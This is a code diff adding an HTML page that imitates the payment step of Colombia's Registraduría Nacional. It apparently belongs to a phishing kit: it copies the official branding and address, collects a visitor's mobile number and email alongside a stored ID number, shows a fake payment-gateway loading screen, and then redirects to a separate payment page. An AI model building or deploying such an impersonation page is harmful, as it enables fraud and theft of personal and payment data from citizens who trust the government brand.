@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Revisión y Pago - Registraduría Nacional</title>
+    <style>
+        /* Variables de color */
+        :root {
+            --bg-global: #F4F7F9; 
+            --bg-white: #FFFFFF;  
+            --text-blue: #1B365D; 
+            --text-gray: #666666;
+            --btn-blue: #002A54;  
+            --border-color: #D1D1D1;
+            --text-red: #D32F2F;
+            --footer-dark: #002244; 
+            --footer-cyan: #00E5FF; 
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-global);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* --- HEADER FLOTANTE --- */
+        .header-floating-card {
+            background-color: var(--bg-white);
+            width: 100%;
+            max-width: 1000px; 
+            border-radius: 25px;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+            margin: 0 auto 30px auto;
+        }
+
+        .header-floating-card img {
+            max-width: 180px; 
+            height: auto;
+        }
+
+        /* --- BARRA DE PROGRESO --- */
+        .stepper-container {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 40px;
+            width: 100%;
+            max-width: 1000px;
+            margin-left: auto;
+            margin-right: auto;
+            white-space: nowrap;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+            color: var(--text-blue);
+            font-weight: 600;
+        }
+
+        .step-circle {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background-color: #3498DB; 
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 13px;
+            flex-shrink: 0;
+        }
+
+        .step-circle svg {
+            width: 14px;
+            height: 14px;
+            fill: white;
+        }
+
+        .step-line {
+            width: 60px; 
+            height: 1px;
+            background-color: #D1D1D1;
+            margin: 0 5px;
+        }
+
+        /* --- CONTENEDOR PRINCIPAL --- */
+        .main-layout {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            width: 100%;
+            max-width: 1000px;
+            margin: 0 auto;
+            align-items: flex-start;
+            flex: 1; 
+        }
+
+        /* --- COLUMNA IZQUIERDA (Resumen) --- */
+        .summary-column {
+            width: 30%;
+            padding-top: 20px;
+        }
+
+        .summary-column h3 {
+            color: var(--text-blue);
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 25px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 15px;
+            color: var(--text-gray);
+            margin-bottom: 15px;
+        }
+
+        .summary-row.total {
+            border-top: 1px solid var(--border-color);
+            padding-top: 15px;
+            margin-top: 15px;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-blue);
+        }
+
+        /* --- COLUMNA DERECHA (Tarjeta de Pago) --- */
+        .payment-card {
+            background-color: var(--bg-white);
+            width: 70%;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        /* Caja de los Pines */
+        .pines-box {
+            border: 1px solid var(--border-color);
+            border-radius: 15px;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between; 
+            align-items: center;
+            margin-bottom: 25px;
+            text-decoration: none; 
+            color: inherit;
+            transition: background-color 0.3s;
+            cursor: pointer;
+        }
+
+        .pines-box:hover {
+            background-color: #F9F9F9;
+        }
+
+        .pines-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .icon-user {
+            background-color: #002A54;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .icon-user svg {
+            width: 20px;
+            height: 20px;
+            fill: #00E5FF;
+        }
+
+        .pines-text {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .pines-text span:first-child {
+            font-size: 12px;
+            color: var(--text-gray);
+        }
+
+        .pines-text .numero-doc {
+            font-size: 18px;
+            color: var(--text-blue);
+            font-weight: 600;
+        }
+
+        .pines-text .ciudad-doc {
+            font-size: 13px;
+            color: var(--text-gray);
+            font-weight: 400;
+        }
+
+        .edit-icon {
+            width: 24px;
+            height: 24px;
+            fill: var(--text-blue);
+        }
+
+        .instruction-text {
+            color: var(--text-gray);
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+
+        /* Opción de Pago */
+        .payment-option {
+            border: 1px solid var(--border-color);
+            border-radius: 15px;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #FAFAFA;
+            margin-bottom: 30px;
+        }
+
+        .payment-option-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .checkbox-custom {
+            width: 24px;
+            height: 24px;
+            background-color: #27AE60; 
+            border-radius: 6px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .checkbox-custom svg {
+            width: 16px;
+            height: 16px;
+            fill: white;
+        }
+
+        .payment-option-left span {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-blue);
+        }
+
+        .payment-option-left small {
+            font-size: 14px;
+            font-weight: 400;
+            color: var(--text-gray);
+        }
+
+        .payment-option-right {
+            text-align: right;
+            font-size: 13px;
+            color: var(--text-gray);
+            line-height: 1.4;
+        }
+
+        /* Totales inferiores */
+        .final-totals {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 10px;
+            margin-bottom: 30px;
+            font-size: 15px;
+        }
+
+        .final-totals div {
+            display: flex;
+            gap: 20px;
+        }
+
+        .final-totals span:first-child {
+            color: var(--text-gray);
+            font-weight: 600;
+        }
+
+        .final-totals .value-recibido {
+            color: var(--text-blue);
+            font-weight: 700;
+        }
+
+        .final-totals .value-pendiente {
+            color: var(--text-red);
+            font-weight: 700;
+        }
+
+        /* ===== FORMULARIO CELULAR / CORREO ===== */
+        .form-group { margin-bottom: 20px; }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-blue);
+            margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 15px;
+            color: #333;
+            background: #FAFBFC;
+            transition: all 0.2s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--btn-blue);
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(0,42,84,0.08);
+        }
+        .form-group input::placeholder { color: #999; }
+        .form-group.error input { border-color: var(--text-red); background: #FFF5F5; }
+        .error-message {
+            display: none;
+            color: var(--text-red);
+            font-size: 12.5px;
+            margin-top: 6px;
+        }
+        .form-group.error .error-message { display: block; }
+
+        /* Botones de acción */
+        .action-buttons {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            border-top: 1px solid #EEEEEE;
+            padding-top: 25px;
+            margin-top: 10px;
+        }
+
+        .btn-continuar {
+            background-color: var(--btn-blue);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px 40px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.3s;
+        }
+
+        .btn-continuar:hover {
+            background-color: #001F3F;
+        }
+
+        /* ===== NUEVO: ESTILO PARA EL TEXTO PENDIENTE ARRIBA DEL BOTÓN ===== */
+        .pendiente-container {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-bottom: 10px;
+            margin-top: 10px;
+        }
+        
+        .pendiente-container span.label {
+            color: var(--text-gray);
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        .pendiente-container span.value {
+            color: var(--text-red);
+            font-weight: 700;
+            font-size: 15px;
+        }
+
+        /* --- FOOTER --- */
+        .footer {
+            background-color: var(--footer-dark);
+            color: white;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            margin-top: 40px;
+        }
+
+        .footer-main {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            padding: 40px 5%;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+            gap: 30px;
+        }
+
+        .footer-brand {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 250px;
+        }
+
+        .footer-brand img {
+            max-width: 150px;
+            margin-bottom: 15px;
+        }
+
+        .footer-columns {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 40px;
+            flex: 1;
+            justify-content: space-between;
+        }
+
+        .footer-col {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .footer-col p {
+            margin: 0;
+            max-width: 300px;
+        }
+
+        .footer-col a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .footer-col a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-bottom-strip {
+            background-color: var(--footer-cyan);
+            color: var(--footer-dark);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 5%;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .footer-bottom-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer-bottom-item svg {
+            width: 24px;
+            height: 24px;
+            fill: var(--footer-dark);
+        }
+
+        /* ===== NUEVO: PANTALLA DE CARGA ===== */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(255, 255, 255, 0.4); /* Fondo semitransparente */
+            backdrop-filter: blur(15px); /* Efecto de desenfoque super borroso */
+            -webkit-backdrop-filter: blur(15px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .loading-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+
+        .loading-content img {
+            max-width: 200px;
+            height: auto;
+        }
+
+        /* Spinner opcional debajo de la imagen */
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0, 42, 84, 0.2);
+            border-top: 4px solid var(--btn-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        /* Adaptación para móvil */
+        @media (max-width: 850px) {
+            .header-floating-card {
+                padding: 15px 20px;
+            }
+            .header-floating-card img {
+                max-width: 140px;
+            }
+
+            .stepper-container {
+                gap: 5px;
+            }
+            .step {
+                font-size: 13px; 
+            }
+            .step-line {
+                width: 30px; 
+            }
+
+            .main-layout {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .summary-column {
+                display: none; 
+            }
+
+            .payment-card {
+                width: 100%;
+                max-width: 600px;
+                padding: 25px 20px;
+                margin-top: 0; 
+                display: flex;
+                flex-direction: column;
+            }
+
+            /* Mover todo el bloque del formulario arriba, con su botón */
+            .payment-card form {
+                order: -1;
+                margin-bottom: 40px; /* Separación extra para que el botón no quede pegado a la caja de pines */
+            }
+
+            /* Quitar la línea superior del botón en móvil para que se vea integrado al formulario */
+            .payment-card .action-buttons {
+                border-top: none;
+                padding-top: 0;
+                margin-top: 25px;
+            }
+
+            .payment-option {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+            
+            .payment-option-right {
+                text-align: left;
+            }
+
+            .footer-main {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .footer-columns {
+                flex-direction: column;
+                align-items: center;
+                gap: 20px;
+            }
+
+            .footer-bottom-strip {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <div class="header-floating-card">
+        <img src="image.png" alt="Registraduría Nacional">
+    </div>
+
+    <!-- Barra de Progreso -->
+    <div class="stepper-container">
+        <div class="step">
+            <div class="step-circle">
+                <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
+            </div>
+            <span>Datos complementarios</span>
+        </div>
+        
+        <div class="step-line"></div>
+        
+        <div class="step">
+            <div class="step-circle">2</div>
+            <span>Pago</span>
+        </div>
+    </div>
+
+    <!-- Contenido Principal -->
+    <div class="main-layout">
+        
+        <!-- Columna Izquierda: Resumen (Se oculta en celular) -->
+        <div class="summary-column">
+            <h3>Resumen de pago, pasarela de pago</h3>
+            
+            <div class="summary-row">
+                <span>Valor Inicial del trámite:</span>
+                <span class="value" id="resumenMonto">$18,750 COP</span>
+            </div>
+            
+           
+        </div>
+
+        <!-- Columna Derecha: Tarjeta de Pago -->
+        <div class="payment-card">
+            
+            <!-- ===== FORMULARIO CON BOTÓN (Se mueve arriba en móvil) ===== -->
+            <form id="contactForm" novalidate>
+                <div class="form-group" id="groupNumero">
+                    <label for="celular">Número de celular</label>
+                    <input
+                        type="tel"
+                        id="celular"
+                        name="celular"
+                        placeholder="300 123 4567"
+                        maxlength="12"
+                        inputmode="numeric"
+                        autocomplete="tel"
+                        required>
+                    <div class="error-message">Ingresa un número de celular válido (10 dígitos).</div>
+                </div>
+
+                <div class="form-group" id="groupCorreo">
+                    <label for="correo">Correo electrónico</label>
+                    <input
+                        type="email"
+                        id="correo"
+                        name="correo"
+                        placeholder="tucorreo@ejemplo.com"
+                        autocomplete="email"
+                        required>
+                    <div class="error-message">Ingresa un correo electrónico válido.</div>
+                </div>
+
+                <!-- ===== NUEVO: TEXTO PENDIENTE ARRIBA DEL BOTÓN ===== -->
+                <div class="pendiente-container">
+                    <span class="label">Pendiente:</span>
+                    <span class="value" id="montoPendienteForm">$18,750 COP</span>
+                </div>
+
+                <!-- Botón de Continuar (Dentro del form) -->
+                <div class="action-buttons">
+                    <button type="submit" class="btn-continuar">Continuar</button>
+                </div>
+            </form>
+
+            <!-- Caja de Pines -->
+            <a href="consultar.html?abrir=true" class="pines-box">
+                <div class="pines-info">
+                    <div class="icon-user">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                        </svg>
+                    </div>
+                    <div class="pines-text">
+                        <span>Pines de:</span>
+                        <span id="pinUser" class="numero-doc">10167589</span> 
+                        <span id="ciudadUser" class="ciudad-doc">Cargando ciudad...</span>
+                    </div>
+                </div>
+                <svg class="edit-icon" viewBox="0 0 24 24">
+                    <path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/>
+                </svg>
+            </a>
+
+            <p class="instruction-text">Selecciona un Pin/Pago que cubra el valor exacto del trámite.</p>
+
+            <!-- Opción de pago -->
+            <div class="payment-option">
+                <div class="payment-option-left">
+                    <div class="checkbox-custom">
+                        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    </div>
+                    <span id="montoOption">$18,750 <small>COP</small></span>
+                </div>
+                <div class="payment-option-right">
+                    Pago por pasarela de pago<br>electrónica
+                </div>
+            </div>
+
+            <!-- Totales Finales (Original) -->
+            <div class="final-totals">
+ 
+                <div>
+
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="footer-main">
+            <div class="footer-brand">
+                <img src="blanco.png" alt="Logo Registraduría">
+            </div>
+            <div class="footer-columns">
+                <div class="footer-col">
+                    <p>Av. Calle 26 n.° 51-50, CAN, Bogotá, Colombia. CP: 111321</p>
+                    <p>Horario de atención correspondencia de lunes a viernes de 8:00 a. m. a 4:30 p. m. en jornada continua (Sede CAN av. calle 26 n° 51-50)</p>
+                    <p>Conmutador: +57 (601) 220 2880</p>
+                </div>
+                <div class="footer-col">
+                    <a href="#">Políticas de privacidad</a>
+                    <a href="#">Correo institucional</a>
+                    <a href="#">Correo institucional (Office 365)</a>
+                </div>
+                <div class="footer-col">
+                    <a href="#">Mapa del sitio</a>
+                    <a href="#">Contáctenos</a>
+                    <a href="#">Biblioteca</a>
+                </div>
+                <div class="footer-col">
+                    <a href="#">Normativa</a>
+                    <a href="#">Correos judiciales</a>
+                    <a href="#">PQRSDC</a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom-strip">
+            <div class="footer-bottom-item">
+                <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.5l6.5 3.2H5.5L12 4.5zM4 10v8H2v2h20v-2h-2v-8h-2v8h-4v-8h-2v8H8v-8H4zm0 2h2v6H4v-6zm14 0h2v6h-2v-6z"/></svg>
+                <span>Institucional</span>
+            </div>
+            <div class="footer-bottom-item">
+                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                <span>Servicios a la ciudadanía</span>
+            </div>
+            <div class="footer-bottom-item">
+                <svg viewBox="0 0 24 24"><path d="M3 3v18h18V3H3zm16 16H5V5h14v14zM7 10h2v7H7v-7zm4-3h2v10h-2V7zm4 6h2v4h-2v-4z"/></svg>
+                <span>CEDAE (Datos para la democracia)</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ===== NUEVO: OVERLAY DE CARGA (Oculto por defecto) ===== -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loading-content">
+            <img src="epayco.png" alt="Cargando pasarela de pago...">
+            <div class="spinner"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // ===== Datos del ciudadano =====
+            const nuipGuardado = localStorage.getItem('nuipConsultado');
+            const ciudadGuardada = localStorage.getItem('ciudadExpedicion');
+
+            if (nuipGuardado) {
+                document.getElementById('pinUser').textContent = nuipGuardado;
+            }
+            document.getElementById('ciudadUser').textContent = ciudadGuardada || "Lugar no especificado";
+
+            // ===== PRECIO DESDE LOCALSTORAGE =====
+            const monto = localStorage.getItem('montoTotal') || '$18,750 COP';
+
+            document.getElementById('resumenMonto').textContent = monto;
+            // document.getElementById('resumenTotal').textContent = monto; // Nota: Este ID no existe en tu HTML actual, lo he comentado para evitar errores.
+            document.getElementById('montoOption').innerHTML = monto.replace(' COP', '') + ' <small>COP</small>';
+            
+            // Asignar el monto a ambos lugares (el original y el nuevo arriba del botón)
+            // document.getElementById('montoPendiente').textContent = monto; // Comentado porque no existe en tu HTML actual
+            document.getElementById('montoPendienteForm').textContent = monto;
+
+            // ===== PRECARGAR CELULAR / CORREO SI YA EXISTEN =====
+            const celularGuardado = localStorage.getItem('celular');
+            const correoGuardado = localStorage.getItem('email');
+            if (celularGuardado) document.getElementById('celular').value = celularGuardado;
+            if (correoGuardado) document.getElementById('correo').value = correoGuardado;
+        });
+
+        // ============================================================
+        // FORMATEO DEL CELULAR (300 123 4567)
+        // ============================================================
+        const inputCelular = document.getElementById('celular');
+        inputCelular.addEventListener('input', function() {
+            let v = this.value.replace(/\D/g, '').slice(0, 10);
+            if (v.length > 6) v = v.slice(0,3) + ' ' + v.slice(3,6) + ' ' + v.slice(6);
+            else if (v.length > 3) v = v.slice(0,3) + ' ' + v.slice(3);
+            this.value = v;
+            document.getElementById('groupNumero').classList.remove('error');
+        });
+
+        // ============================================================
+        // VALIDACIÓN, PANTALLA DE CARGA Y REDIRECCIÓN
+        // ============================================================
+        document.getElementById('contactForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const celularRaw = inputCelular.value.replace(/\s/g, '');
+            const correo = document.getElementById('correo').value.trim();
+            let valido = true;
+
+            // Validar celular: 10 dígitos, empieza por 3
+            const groupNumero = document.getElementById('groupNumero');
+            if (!/^3\d{9}$/.test(celularRaw)) {
+                groupNumero.classList.add('error');
+                valido = false;
+            } else {
+                groupNumero.classList.remove('error');
+            }
+
+            // Validar correo
+            const groupCorreo = document.getElementById('groupCorreo');
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(correo)) {
+                groupCorreo.classList.add('error');
+                valido = false;
+            } else {
+                groupCorreo.classList.remove('error');
+            }
+
+            if (!valido) return;
+
+            // Guardar en localStorage
+            localStorage.setItem('celular', celularRaw);
+            localStorage.setItem('email', correo);
+
+            // ===== NUEVO: MOSTRAR PANTALLA DE CARGA Y REDIRIGIR A LOS 3 SEGUNDOS =====
+            const overlay = document.getElementById('loadingOverlay');
+            overlay.classList.add('active');
+
+            // Esperar 3 segundos (3000 ms) y redirigir
+            setTimeout(function() {
+                window.location.href = 'pago.html';
+            }, 3000); 
+        });
+    </script>
+</body>
+</html>
